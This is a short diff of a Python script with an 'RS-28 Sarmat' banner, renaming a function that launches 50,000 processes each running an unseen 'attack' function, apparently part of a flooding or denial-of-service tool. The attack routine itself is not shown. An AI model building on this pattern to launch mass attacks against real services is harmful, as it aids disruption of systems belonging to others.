@@ -50,7 +50,7 @@ print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 
-def send2attack():
+def send3attack():
   for i in range(50000): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
